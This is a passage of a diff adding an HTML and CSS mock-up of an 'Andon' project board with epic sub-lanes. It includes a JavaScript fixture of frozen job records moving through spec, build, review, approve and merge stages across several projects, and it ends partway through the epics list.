+  .field textarea { width: 100%; height: 76px; resize: none; border-radius: 6px; border: 0; background: rgba(0,0,0,.25); box-shadow: inset 0 0 0 .5px var(--sep2); padding: 7px 9px; font-size: 12.5px; outline: none; }
+  .field textarea:focus { box-shadow: 0 0 0 3px rgba(10,132,255,.5), inset 0 0 0 .5px var(--blue); }
+  .field .cmd { margin-top: 10px; }
+  .keys { margin: 0 18px 4px; display: grid; grid-template-columns: auto 1fr; gap: 7px 14px; font-size: 12px; }
+  .keys kbd { font: 11px var(--mono); background: rgba(255,255,255,.1); border-radius: 4px; padding: 1px 6px; box-shadow: 0 .5px 0 rgba(255,255,255,.15) inset; justify-self: start; }
+
+  /* ── toast (HUD) ────────────────────────────── */
+  .hud { position: fixed; left: 50%; bottom: 56px; transform: translate(-50%, 10px); z-index: 40; padding: 9px 16px; border-radius: 10px;
+    background: rgba(40,40,44,.92); backdrop-filter: blur(24px); box-shadow: 0 0 0 .5px rgba(255,255,255,.16) inset, 0 10px 30px rgba(0,0,0,.5);
+    font-size: 12.5px; display: flex; gap: 8px; align-items: center; opacity: 0; pointer-events: none; transition: opacity .2s, transform .2s; }
+  .hud.on { opacity: 1; transform: translate(-50%, 0); }
+  .hud svg { color: var(--green); }
+  .hud code { font: 11.5px var(--mono); color: var(--label2); }
+
+  /* ── epics ──────────────────────────────────── */
+  /* A project lane with epics: a faint separator to its sub-lanes. */
+  .row.has-sub { border-bottom-color: rgba(255,255,255,.035); }
+  .row.has-sub > .gut, .row.sub > .gut { position: relative; }
+  /* The epic sub-lane: indented gutter, an elbow from the project, and a quiet tint. */
+  .row.sub { background: rgba(255,255,255,.018); }
+  .row.sub > .gut { padding-left: 30px !important; }
+  .row.sub > .gut::before { content: ""; position: absolute; left: 17px; top: -1px; height: 14px; width: 8px; border-left: 1px solid var(--label4); border-bottom: 1px solid var(--label4); border-bottom-left-radius: 5px; }
+  .row.sub:not(.last) > .gut::after { content: ""; position: absolute; left: 17px; top: 0; bottom: -1px; border-left: 1px solid var(--label4); }
+  .row.sub.hotgut > .gut { background: rgba(255,69,58,.075); box-shadow: inset 2px 0 0 rgba(255,69,58,.55); }
+  .en { border: 0; background: none; padding: 0; text-align: left; font-size: 12px; font-weight: 600; color: var(--label); display: flex; align-items: flex-start; gap: 6px; line-height: 1.3; min-width: 0; }
+  .en .edot { width: 7px; height: 7px; border-radius: 50%; background: var(--label4); flex: none; margin-top: 4.5px; }
+  .edot.active { background: var(--blue); } .edot.hot { background: var(--red); box-shadow: 0 0 0 3px rgba(255,69,58,.18); }
+  .edot.landing { background: var(--green); animation: pend 1.4s ease-in-out infinite; } .edot.landed { background: var(--green); }
+  .en .ename { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+  .en:hover .ename { text-decoration: underline; text-decoration-color: var(--label3); text-underline-offset: 2px; }
+  .en.sel .ename { color: #6cb4ff; }
+  .en:focus-visible { outline: 2px solid var(--blue); outline-offset: 1px; border-radius: 3px; }
+  .egut .meta.wrap { white-space: normal; }
+  .egut .nw { white-space: nowrap; }
+  .egut .meta .landing { color: var(--green); }
+  /* tokens inside an epic */
+  .htag { flex: none; font: 600 9px/13px var(--mono); padding: 0 4px; border-radius: 3px; background: rgba(255,255,255,.12); color: var(--label); letter-spacing: .02em; }
+  .k-approve .htag { background: rgba(255,255,255,.24); color: #fff; }
+  .tok.ie::before { background: repeating-linear-gradient(180deg, var(--green) 0 3px, transparent 3px 5px); }
+  .tok.ie { background: rgba(48,209,88,.045); border-style: dashed; border-color: rgba(48,209,88,.3); }
+  .tok .l1 .age { flex: none; padding-left: 2px; } /* a merged token's time, on line 1: the title gives way, the time never wraps */
+  .tok .l1 .iem + .age { padding-left: 0; }
+  .iem { display: inline-flex; align-self: center; flex: none; color: var(--green); margin-left: auto; }
+  .iem svg { width: 11px; height: 11px; }
+  .key .iem { margin-left: -2px; }
+  .sw.ie { --kc: var(--green); background: rgba(48,209,88,.08); border-style: dashed; border-color: rgba(48,209,88,.5); }
+  /* inspector: epic page */
+  .ins-scroll { flex: 1; min-height: 0; overflow-y: auto; }
+  .ins-scroll .files { max-height: none; overflow: visible; }
+  .ins-scroll .doc { overflow: visible; }
+  .stage-chip.e-running { background: rgba(10,132,255,.22); color: #6cb4ff; }
+  .stage-chip.e-waiting, .stage-chip.e-stalled { background: rgba(255,69,58,.2); color: #ff8a82; }
+  .stage-chip.e-landing, .stage-chip.e-landed { background: rgba(48,209,88,.15); color: var(--green); }
+  .stage-chip.epic { background: none; box-shadow: inset 0 0 0 .5px var(--label4); color: var(--label3); }
+  .eprog { display: flex; gap: 2px; margin-top: 9px; height: 5px; }
+  .eprog i { flex: 1; border-radius: 2px; background: var(--label4); }
+  .eprog i.merged { background: var(--green); } .eprog i.k-build { background: var(--indigo); } .eprog i.k-reviewing { background: var(--purple); }
+  .eprog i.k-approve { background: var(--blue); } .eprog i.k-spec { background: var(--teal); } .eprog i.k-review-failed { background: var(--orange); }
+  .eprog i.needs-human { background: var(--red); } .eprog i.blocked { background: none; box-shadow: inset 0 0 0 1px rgba(255,69,58,.55); }
+  .eprog i.queued { background: none; box-shadow: inset 0 0 0 1px var(--label4); }
+  .members { padding: 6px 8px 8px; border-bottom: .5px solid var(--sep); }
+  .members h5, .files h5 { margin: 6px 8px 3px; font-size: 10.5px; font-weight: 600; color: var(--label3); display: flex; justify-content: space-between; }
+  .mem { display: grid; grid-template-columns: 14px minmax(0, 1fr) auto; gap: 1px 8px; align-items: center; padding: 5px 8px; border-radius: 6px; }
+  .mem:hover { background: rgba(255,255,255,.035); }
+  .mem + .mem { box-shadow: 0 -.5px 0 var(--sep); }
+  .mem .mi { font: 10.5px var(--mono); color: var(--label3); text-align: right; }
+  .mem .mt { font-size: 12px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .mem .ms { font: 10.5px var(--mono); color: var(--label3); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 1px; }
+  .mem .ms b { font-weight: 400; color: var(--label2); }
+  .mem .mr { display: flex; align-items: center; gap: 6px; justify-content: flex-end; }
+  .mst { font-size: 10.5px; white-space: nowrap; display: inline-flex; align-items: center; gap: 3px; padding: 0 5px; height: 16px; border-radius: 4px; font-variant-numeric: tabular-nums; }
+  .mst svg { width: 10px; height: 10px; }
+  .mst.merged { color: var(--green); background: rgba(48,209,88,.12); }
+  .mst.running { color: var(--label2); background: rgba(255,255,255,.06); }
+  .mst.running i { width: 6px; height: 6px; border-radius: 1.5px; background: var(--kc); }
+  .mst.needs-human { color: #fff; background: var(--red); font-weight: 600; }
+  .mst.blocked { color: #ff8a82; box-shadow: inset 0 0 0 .5px rgba(255,69,58,.55); }
+  .mst.queued { color: var(--label3); box-shadow: inset 0 0 0 .5px var(--label4); }
+  .jid { border: 0; background: none; padding: 0 2px; font: 600 11px var(--mono); color: #4da3ff; border-radius: 3px; }
+  .jid::before { content: "job "; font-weight: 400; color: var(--label3); }
+  .jid.none::before { content: "not claimed"; }
+  .jid:hover { text-decoration: underline; text-underline-offset: 2px; }
+  .jid:focus-visible { outline: 2px solid var(--blue); outline-offset: 1px; }
+  .jid.none { color: var(--label4); font-weight: 400; }
+  .elink { border: 0; background: none; padding: 0; margin-top: 6px; font-size: 11px; color: var(--label2); display: inline-flex; align-items: center; gap: 5px; }
+  .elink svg { width: 12px; height: 12px; color: var(--label3); }
+  .elink b { font-weight: 600; color: #6cb4ff; }
+  .elink:hover b { text-decoration: underline; text-underline-offset: 2px; }
+  .callout .why b { color: #fff; font-weight: 600; }
+  .callout .sub { font-size: 11px; color: rgba(255,176,169,.75); margin: -4px 0 9px 21px; }
+
+  html, body { margin: 0; }
+  .panel { width: 728px; box-sizing: border-box; padding: 16px; border-radius: 12px; background: #141416;
+    box-shadow: 0 0 0 .5px rgba(255,255,255,.14) inset; }
+  .cap { font-size: 11px; font-weight: 600; color: var(--label3); margin: 0 0 7px 2px; display: flex; justify-content: space-between; }
+  .cap span { font-weight: 400; }
+  .frame { border-radius: 9px; overflow: hidden; box-shadow: 0 0 0 .5px rgba(0,0,0,.8), 0 0 0 .5px rgba(255,255,255,.12) inset; background: var(--canvas); }
+  .panel .tok, .panel .ghost, .panel button { pointer-events: none; }
+
+  /* narrower board: a 112px gutter and ~93px columns, same type sizes */
+  /* the panel gives Merged a little more room so one-line merged titles stay readable */
+  .panel .board { --cols: 112px repeat(5, minmax(0, 1fr)) minmax(0, 1.3fr); padding-bottom: 0; }
+  .panel .row > div { padding: 4px 4px; }
+  .panel .head { position: static; }
+  .panel .head > div { padding: 7px 6px 6px; }
+  .panel .head .corner { font-size: 10.5px; }
+  .panel .gut { padding: 5px 6px 4px 10px !important; }
+  .panel .row.sub > .gut { padding-left: 23px !important; }
+  .panel .row.sub > .gut::before, .panel .row.sub:not(.last) > .gut::after { left: 13px; width: 6px; }
+  .panel .tok { padding: 4px 5px 5px 8px; font-size: 11.5px; }
+  .panel .tok .l1 { gap: 4px; }
+  .panel .tok .num { font-size: 10.5px; }
+  .panel .htag { padding: 0 3px; }
+  .panel .ghost { padding: 2px 5px; }
+  .panel .row:last-child { border-bottom: 0; }
+  .panel .tok .sl { white-space: normal; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; line-height: 1.25; }
+  .panel .tok .l1 { align-items: flex-start; }
+  .panel .tok .num { line-height: 15px; }
+  /* merged tokens stay one line: the title ellipsizes, the time never wraps */
+  .panel .k-merged .sl, .panel .k-settled .sl { display: block; white-space: nowrap; -webkit-line-clamp: unset; }
+  .panel .k-merged .l1, .panel .k-settled .l1 { align-items: baseline; }
+  .panel .k-approve .l1 { padding-right: 12px; }
+  .panel .k-approve .seal { right: 4px; top: 4px; }
+  .panel .v { padding: 0 2.5px; font-size: 9px; }
+  .panel .tok .l2 { gap: 2px 4px; }
+  .panel .gut .meta { white-space: normal; }
+  .panel .egut .meta:last-child .nw { white-space: normal; }
+</style>
+</head>
+<body>
+<div class="panel" role="img" aria-label="Andon board with epic sub-lanes">
+  <div class="cap">All Projects · epic sub-lanes<span>minerva, aegis-v5 and factory, in board order (trouble first)</span></div>
+  <div class="frame"><div class="board" id="board"></div></div>
+</div>
+<script>
+// Shared fixture for every Andon overview mock-up: one frozen moment across 12 projects.
+// Stages follow factory/v1: claimed → spec → build → review → approve → merged, plus
+// needs-human (escalated or merge failed). A merged job older than 24h is *settled*.
+// Times are minutes before NOW. Verdicts: PASS | CHANGES | pending.
+//
+// Epics (design mock-up): an epic runs a set of member briefs, ordered by `after:` edges, on an
+// integration branch `factory/epic/<slug>`. Member jobs are ordinary jobs whose target is the epic
+// branch (`epic: <slug>`); generated helper jobs carry `helper: 'sync' | 'fix'`. A member merged
+// into the epic branch is not on the project's target yet, so it never settles: it stays in
+// Merged, marked "in epic", until the epic lands with one merge. Members with no job yet are
+// derived as queued (deps unmet or parallel cap) or blocked on <job> (a dependency escalated).
+(function () {
+  const NOW = Date.parse('2026-10-25T16:30:00Z');
+  const ago = (m) => NOW - m * 60000;
+
+  const projects = [
+    { id: 'factory', name: 'factory', reviewers: ['security', 'contract', 'code', 'ui'] },
+    { id: 'minerva', name: 'minerva', reviewers: ['security', 'ux', 'ui', 'code'] },
+    { id: 'aegis', name: 'aegis-v5', reviewers: ['security', 'code', 'ui'] },
+    { id: 'brain', name: 'brain-cli', reviewers: ['code'] },
+    { id: 'tinyjs', name: 'tinyjs', reviewers: ['code', 'ui'] },
+    { id: 'ledger', name: 'ledgerline', reviewers: ['security', 'code'] },
+    { id: 'harbor', name: 'harbor', reviewers: ['security', 'code'] },
+    { id: 'quill', name: 'quill', reviewers: ['ux', 'code'] },
+    { id: 'orchard', name: 'orchard', reviewers: ['security', 'ux', 'code'] },
+    { id: 'beacon', name: 'beacon', reviewers: ['code'] },
+    { id: 'carto', name: 'cartograph', reviewers: ['code', 'ui'] },
+    { id: 'sundial', name: 'sundial', reviewers: ['code'] },
+  ];
+
+  // history: [stage, minutesAgo] in order. rounds: { round, at, reviews: { key: [verdict, finishedMinutesAgo|null] } }
+  // kind (derived for convenience): settled | merged | needs-human | review-failed | reviewing | approve | build | spec | claimed
+  const J = (o) => o;
+  const jobs = [
+    // ── factory ──
+    J({ project: 'factory', id: '022-board-timeline', title: 'Timeline view for the Andon overview', stage: 'build', round: 0, maxRound: 2,
+      history: [['claimed', 52], ['spec', 50], ['build', 31]], rounds: [], decision: null, note: '' }),
+    J({ project: 'factory', id: '023-upgrade-dry-run', title: 'factory upgrade --dry-run prints the plan', stage: 'review', round: 1, maxRound: 2,
+      history: [['claimed', 140], ['spec', 138], ['build', 121], ['review', 64]],
+      rounds: [{ round: 1, at: 64, reviews: { security: ['PASS', 41], contract: ['pending', null], code: ['pending', null], ui: ['PASS', 58] } }], decision: null, note: '' }),
+    J({ project: 'factory', id: '021-tinyjs-065-types', title: 'Move the shell to Tiny JS 0.65 types', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 410], ['spec', 405], ['build', 380], ['review', 300], ['approve', 230], ['merged', 214]],
+      rounds: [{ round: 1, at: 300, reviews: { security: ['PASS', 270], contract: ['PASS', 262], code: ['PASS', 241], ui: ['PASS', 255] } }], decision: 'APPROVE', note: 'merged 7905ffe' }),
+    J({ project: 'factory', id: '020-overlay-outcome', title: 'Overlay outcome rule in role templates', stage: 'merged', round: 2, maxRound: 2,
+      history: [['claimed', 2900], ['spec', 2890], ['build', 2860], ['review', 2790], ['build', 2740], ['review', 2690], ['approve', 2640], ['merged', 2620]],
+      rounds: [{ round: 1, at: 2790, reviews: { security: ['PASS', 2770], contract: ['CHANGES', 2750], code: ['PASS', 2760], ui: ['PASS', 2775] } },
+               { round: 2, at: 2690, reviews: { security: ['PASS', 2670], contract: ['PASS', 2655], code: ['PASS', 2660], ui: ['PASS', 2680] } }], decision: 'APPROVE', note: 'merged a1edc16' }),
+    // factory · epic archive-record (target factory/epic/archive-record)
+    J({ project: 'factory', epic: 'archive-record', id: '024-backlog-open-only', title: 'Backlog lists open jobs only', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 698], ['spec', 694], ['build', 668], ['review', 610], ['approve', 575], ['merged', 566]],
+      rounds: [{ round: 1, at: 610, reviews: { security: ['PASS', 596], contract: ['PASS', 588], code: ['PASS', 580], ui: ['PASS', 600] } }], decision: 'APPROVE', note: 'merged 4c81d0a' }),
+    J({ project: 'factory', epic: 'archive-record', id: '025-job-archive', title: 'Move settled jobs to an archive record', stage: 'merged', round: 2, maxRound: 2,
+      history: [['claimed', 565], ['spec', 561], ['build', 530], ['review', 455], ['build', 420], ['review', 372], ['approve', 340], ['merged', 331]],
+      rounds: [{ round: 1, at: 455, reviews: { security: ['PASS', 440], contract: ['CHANGES', 424], code: ['PASS', 432], ui: ['PASS', 446] } },
+               { round: 2, at: 372, reviews: { security: ['PASS', 360], contract: ['PASS', 349], code: ['PASS', 352], ui: ['PASS', 364] } }], decision: 'APPROVE', note: 'merged b0e7f52' }),
+    J({ project: 'factory', epic: 'archive-record', id: '026-andon-reads-archive', title: 'Andon reads settled jobs from the archive', stage: 'review', round: 1, maxRound: 2,
+      history: [['claimed', 330], ['spec', 326], ['build', 298], ['review', 41]],
+      rounds: [{ round: 1, at: 41, reviews: { security: ['PASS', 19], contract: ['pending', null], code: ['pending', null], ui: ['PASS', 27] } }], decision: null, note: '' }),
+    J({ project: 'factory', epic: 'archive-record', id: '027-job-prune', title: 'factory prune drops archived worktrees', stage: 'build', round: 0, maxRound: 2,
+      history: [['claimed', 329], ['spec', 325], ['build', 26]], rounds: [], decision: null, note: '' }),
+    J({ project: 'factory', epic: 'archive-record', helper: 'sync', id: '028-sync-archive-record', title: 'Sync main into the epic branch', stage: 'approve', round: 1, maxRound: 2,
+      history: [['claimed', 208], ['build', 206], ['review', 170], ['approve', 9]],
+      rounds: [{ round: 1, at: 170, reviews: { security: ['PASS', 150], contract: ['PASS', 141], code: ['PASS', 12], ui: ['PASS', 155] } }], decision: null,
+      note: 'conflict in apps/andon/src/settled.ts after 021 landed on main' }),
+
+    // ── minerva ──
+    J({ project: 'minerva', id: '041-notes-search', title: 'Full-text search across notes', stage: 'review', round: 2, maxRound: 2,
+      history: [['claimed', 300], ['spec', 296], ['build', 270], ['review', 200], ['build', 160], ['review', 38]],
+      rounds: [{ round: 1, at: 200, reviews: { security: ['PASS', 180], ux: ['PASS', 175], ui: ['PASS', 178], code: ['CHANGES', 162] } },
+               { round: 2, at: 38, reviews: { security: ['PASS', 22], ux: ['pending', null], ui: ['PASS', 19], code: ['pending', null] } }], decision: null, note: '' }),
+    J({ project: 'minerva', id: '040-tag-migration', title: 'Migrate tags to a join table', stage: 'needs-human', round: 1, maxRound: 2,
+      history: [['claimed', 520], ['spec', 515], ['build', 490], ['review', 430], ['approve', 380], ['needs-human', 366]],
+      rounds: [{ round: 1, at: 430, reviews: { security: ['PASS', 410], ux: ['PASS', 405], ui: ['PASS', 400], code: ['PASS', 392] } }],
+      decision: 'ESCALATE', note: 'approver: migration drops notes.tags without a backfill' }),
+    J({ project: 'minerva', id: '039-daily-digest', title: 'Daily digest email', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 240], ['spec', 236], ['build', 210], ['review', 150], ['approve', 90], ['merged', 64]],
+      rounds: [{ round: 1, at: 150, reviews: { security: ['PASS', 130], ux: ['PASS', 120], ui: ['PASS', 125], code: ['PASS', 100] } }], decision: 'APPROVE', note: 'merged 3c9e01a' }),
+    J({ project: 'minerva', id: '038-keyboard-nav', title: 'Keyboard navigation in the sidebar', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 3100], ['spec', 3095], ['build', 3070], ['review', 3010], ['approve', 2960], ['merged', 2950]],
+      rounds: [{ round: 1, at: 3010, reviews: { security: ['PASS', 2990], ux: ['PASS', 2980], ui: ['PASS', 2985], code: ['PASS', 2970] } }], decision: 'APPROVE', note: 'merged 77ad2b0' }),
+    // minerva · epic tags-v2 (target factory/epic/tags-v2)
+    J({ project: 'minerva', epic: 'tags-v2', id: '042-tag-colors', title: 'Tag colors', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 548], ['spec', 544], ['build', 520], ['review', 470], ['approve', 432], ['merged', 424]],
+      rounds: [{ round: 1, at: 470, reviews: { security: ['PASS', 455], ux: ['PASS', 450], ui: ['PASS', 446], code: ['PASS', 440] } }], decision: 'APPROVE', note: 'merged 9a2c4e1' }),
+    J({ project: 'minerva', epic: 'tags-v2', id: '043-tag-rename', title: 'Rename a tag everywhere', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 547], ['spec', 543], ['build', 515], ['review', 452], ['approve', 410], ['merged', 401]],
+      rounds: [{ round: 1, at: 452, reviews: { security: ['PASS', 438], ux: ['PASS', 433], ui: ['PASS', 429], code: ['PASS', 418] } }], decision: 'APPROVE', note: 'merged 1f7b3d8' }),
+    J({ project: 'minerva', epic: 'tags-v2', id: '044-tag-hierarchy', title: 'Nested tags', stage: 'needs-human', round: 1, maxRound: 2,
+      history: [['claimed', 423], ['spec', 419], ['build', 392], ['review', 318], ['approve', 262], ['needs-human', 248]],
+      rounds: [{ round: 1, at: 318, reviews: { security: ['PASS', 300], ux: ['PASS', 294], ui: ['PASS', 290], code: ['PASS', 276] } }],
+      decision: 'ESCALATE', note: 'approver: a tag can be made its own ancestor; the tree query never ends' }),
+
+    // ── aegis ──
+    J({ project: 'aegis', id: '112-admin-roles', title: 'Admin role editor', stage: 'approve', round: 1, maxRound: 2,
+      history: [['claimed', 180], ['spec', 176], ['build', 150], ['review', 70], ['approve', 6]],
+      rounds: [{ round: 1, at: 70, reviews: { security: ['PASS', 30], code: ['PASS', 12], ui: ['PASS', 44] } }], decision: null, note: '' }),
+    J({ project: 'aegis', id: '113-audit-log', title: 'Audit log for project changes', stage: 'spec', round: 0, maxRound: 2,
+      history: [['claimed', 9], ['spec', 7]], rounds: [], decision: null, note: '' }),
+    J({ project: 'aegis', id: '111-session-timeout', title: 'Configurable session timeout', stage: 'needs-human', round: 1, maxRound: 2,
+      history: [['claimed', 400], ['spec', 396], ['build', 370], ['review', 310], ['approve', 250], ['needs-human', 232]],
+      rounds: [{ round: 1, at: 310, reviews: { security: ['PASS', 290], code: ['PASS', 270], ui: ['PASS', 280] } }],
+      decision: 'APPROVE', note: 'merge failed: conflict in src/routes/(admin)/+layout.svelte' }),
+    J({ project: 'aegis', id: '110-project-archive', title: 'Archive projects', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 4300], ['spec', 4295], ['build', 4270], ['review', 4200], ['approve', 4150], ['merged', 4140]],
+      rounds: [{ round: 1, at: 4200, reviews: { security: ['PASS', 4180], code: ['PASS', 4170], ui: ['PASS', 4175] } }], decision: 'APPROVE', note: 'merged e01f9c2' }),
+    // aegis-v5 · epic admin-console (target factory/epic/admin-console); every member merged in epic
+    J({ project: 'aegis', epic: 'admin-console', id: '114-admin-shell', title: 'Admin console shell and nav', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 843], ['spec', 839], ['build', 810], ['review', 740], ['approve', 702], ['merged', 694]],
+      rounds: [{ round: 1, at: 740, reviews: { security: ['PASS', 722], code: ['PASS', 712], ui: ['PASS', 728] } }], decision: 'APPROVE', note: 'merged 3e90b6f' }),
+    J({ project: 'aegis', epic: 'admin-console', id: '115-admin-users', title: 'User management page', stage: 'merged', round: 2, maxRound: 2,
+      history: [['claimed', 690], ['spec', 686], ['build', 655], ['review', 560], ['build', 520], ['review', 430], ['approve', 396], ['merged', 388]],
+      rounds: [{ round: 1, at: 560, reviews: { security: ['CHANGES', 532], code: ['PASS', 540], ui: ['PASS', 548] } },
+               { round: 2, at: 430, reviews: { security: ['PASS', 410], code: ['PASS', 404], ui: ['PASS', 418] } }], decision: 'APPROVE', note: 'merged c51a7e0' }),
+    J({ project: 'aegis', epic: 'admin-console', id: '116-admin-settings', title: 'Workspace settings page', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 689], ['spec', 685], ['build', 640], ['review', 120], ['approve', 44], ['merged', 31]],
+      rounds: [{ round: 1, at: 120, reviews: { security: ['PASS', 92], code: ['PASS', 78], ui: ['PASS', 101] } }], decision: 'APPROVE', note: 'merged 07dd5a2' }),
+
+    // ── brain-cli ──
+    J({ project: 'brain', id: '017-stage-diff', title: '017-stage-diff', stage: 'claimed', round: 0, maxRound: 2,
+      history: [['claimed', 1]], rounds: [], decision: null, note: '' }),
+    J({ project: 'brain', id: '016-milestone-close', title: 'Close a milestone from the CLI', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 470], ['spec', 466], ['build', 440], ['review', 400], ['approve', 380], ['merged', 372]],
+      rounds: [{ round: 1, at: 400, reviews: { code: ['PASS', 385] } }], decision: 'APPROVE', note: 'merged 5b2d7e4' }),
+
+    // ── tinyjs ──
+    J({ project: 'tinyjs', id: '066-tray-menu', title: 'Tray menu API', stage: 'build', round: 1, maxRound: 2,
+      history: [['claimed', 220], ['spec', 216], ['build', 190], ['review', 120], ['build', 17]],
+      rounds: [{ round: 1, at: 120, reviews: { code: ['PASS', 90], ui: ['CHANGES', 20] } }], decision: null, note: 'R1 ui: menu items ignore the disabled flag' }),
+    J({ project: 'tinyjs', id: '065-window-types', title: 'Ship window types in the package', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 1900], ['spec', 1896], ['build', 1870], ['review', 1820], ['approve', 1790], ['merged', 1780]],
+      rounds: [{ round: 1, at: 1820, reviews: { code: ['PASS', 1800], ui: ['PASS', 1805] } }], decision: 'APPROVE', note: 'merged 0ac41de' }),
+
+    // ── ledgerline ──
+    J({ project: 'ledger', id: '008-csv-import', title: 'Import transactions from CSV', stage: 'review', round: 1, maxRound: 2,
+      history: [['claimed', 160], ['spec', 156], ['build', 130], ['review', 55]],
+      rounds: [{ round: 1, at: 55, reviews: { security: ['CHANGES', 3], code: ['PASS', 26] } }], decision: null, note: 'R1 security: CSV formulas not escaped on export' }),
+    J({ project: 'ledger', id: '007-oauth-banks', title: 'OAuth bank connections', stage: 'needs-human', round: 2, maxRound: 2,
+      history: [['claimed', 700], ['spec', 695], ['build', 660], ['review', 590], ['build', 560], ['review', 470], ['needs-human', 440]],
+      rounds: [{ round: 1, at: 590, reviews: { security: ['CHANGES', 565], code: ['PASS', 575] } },
+               { round: 2, at: 470, reviews: { security: ['CHANGES', 442], code: ['PASS', 455] } }],
+      decision: null, note: 'review budget spent: security CHANGES in R2 (tokens logged)' }),
+    J({ project: 'ledger', id: '006-currency-format', title: 'Locale-aware currency format', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 2300], ['spec', 2296], ['build', 2270], ['review', 2220], ['approve', 2190], ['merged', 2185]],
+      rounds: [{ round: 1, at: 2220, reviews: { security: ['PASS', 2200], code: ['PASS', 2205] } }], decision: 'APPROVE', note: 'merged 91be3f0' }),
+
+    // ── harbor (idle) ──
+    J({ project: 'harbor', id: '014-health-checks', title: 'Container health checks', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 5200], ['spec', 5195], ['build', 5160], ['review', 5100], ['approve', 5070], ['merged', 5060]],
+      rounds: [{ round: 1, at: 5100, reviews: { security: ['PASS', 5080], code: ['PASS', 5085] } }], decision: 'APPROVE', note: 'merged 4d0c8aa' }),
+    J({ project: 'harbor', id: '013-port-ranges', title: 'Port range validation', stage: 'merged', round: 2, maxRound: 2,
+      history: [['claimed', 6100], ['spec', 6095], ['build', 6070], ['review', 6000], ['build', 5970], ['review', 5900], ['approve', 5870], ['merged', 5860]],
+      rounds: [{ round: 1, at: 6000, reviews: { security: ['PASS', 5980], code: ['CHANGES', 5975] } },
+               { round: 2, at: 5900, reviews: { security: ['PASS', 5885], code: ['PASS', 5880] } }], decision: 'APPROVE', note: 'merged 2e7b11c' }),
+
+    // ── quill ──
+    J({ project: 'quill', id: '003-export-pdf', title: 'Export a draft to PDF', stage: 'build', round: 0, maxRound: 2,
+      history: [['claimed', 75], ['spec', 72], ['build', 48]], rounds: [], decision: null, note: '' }),
+    J({ project: 'quill', id: '002-word-count', title: 'Live word count', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 1300], ['spec', 1296], ['build', 1270], ['review', 1230], ['approve', 1210], ['merged', 1200]],
+      rounds: [{ round: 1, at: 1230, reviews: { ux: ['PASS', 1215], code: ['PASS', 1218] } }], decision: 'APPROVE', note: 'merged c3f0b19' }),
+
+    // ── orchard ──
+    J({ project: 'orchard', id: '019-sync-retry', title: 'Retry failed syncs with backoff', stage: 'review', round: 1, maxRound: 2,
+      history: [['claimed', 95], ['spec', 92], ['build', 70], ['review', 12]],
+      rounds: [{ round: 1, at: 12, reviews: { security: ['pending', null], ux: ['pending', null], code: ['pending', null] } }], decision: null, note: '' }),
+    J({ project: 'orchard', id: '018-offline-queue', title: 'Offline write queue', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 3600], ['spec', 3595], ['build', 3560], ['review', 3500], ['approve', 3470], ['merged', 3460]],
+      rounds: [{ round: 1, at: 3500, reviews: { security: ['PASS', 3480], ux: ['PASS', 3485], code: ['PASS', 3478] } }], decision: 'APPROVE', note: 'merged 6a5e2d9' }),
+
+    // ── beacon (idle) ──
+    J({ project: 'beacon', id: '005-status-page', title: 'Public status page', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 8000], ['spec', 7995], ['build', 7960], ['review', 7900], ['approve', 7880], ['merged', 7870]],
+      rounds: [{ round: 1, at: 7900, reviews: { code: ['PASS', 7885] } }], decision: 'APPROVE', note: 'merged b77e0f3' }),
+
+    // ── cartograph ──
+    J({ project: 'carto', id: '031-tile-cache', title: 'Disk cache for map tiles', stage: 'approve', round: 2, maxRound: 2,
+      history: [['claimed', 260], ['spec', 256], ['build', 230], ['review', 170], ['build', 140], ['review', 60], ['approve', 14]],
+      rounds: [{ round: 1, at: 170, reviews: { code: ['CHANGES', 145], ui: ['PASS', 150] } },
+               { round: 2, at: 60, reviews: { code: ['PASS', 15], ui: ['PASS', 40] } }], decision: null, note: '' }),
+    J({ project: 'carto', id: '030-geojson-layers', title: 'GeoJSON overlay layers', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 330], ['spec', 326], ['build', 300], ['review', 230], ['approve', 140], ['merged', 128]],
+      rounds: [{ round: 1, at: 230, reviews: { code: ['PASS', 160], ui: ['PASS', 190] } }], decision: 'APPROVE', note: 'merged 8f13ac7' }),
+
+    // ── sundial ──
+    J({ project: 'sundial', id: '005-cron-parse', title: 'Parse cron expressions', stage: 'spec', round: 0, maxRound: 2,
+      history: [['claimed', 22], ['spec', 20]], rounds: [], decision: null, note: '' }),
+    J({ project: 'sundial', id: '004-tz-support', title: 'Time zone support', stage: 'merged', round: 1, maxRound: 2,
+      history: [['claimed', 2600], ['spec', 2596], ['build', 2570], ['review', 2520], ['approve', 2500], ['merged', 2490]],
+      rounds: [{ round: 1, at: 2520, reviews: { code: ['PASS', 2505] } }], decision: 'APPROVE', note: 'merged 1d4e6b8' }),
+  ];
+
+  // Epics. members are in plan order; `job` is null until the member is claimed.
+  // blocked: an epic-level stop (landing blocked), which is one more needs-human item.
+  const epics = [
+    { project: 'factory', slug: 'archive-record', title: 'Archive the job record', target: 'main', started: 700, blocked: null,
+      members: [
+        { slug: 'backlog-open-only', title: 'Backlog lists open jobs only', after: [], job: '024-backlog-open-only' },
+        { slug: 'job-archive', title: 'Move settled jobs to an archive record', after: ['backlog-open-only'], job: '025-job-archive' },
+        { slug: 'andon-reads-archive', title: 'Andon reads settled jobs from the archive', after: ['job-archive'], job: '026-andon-reads-archive' },
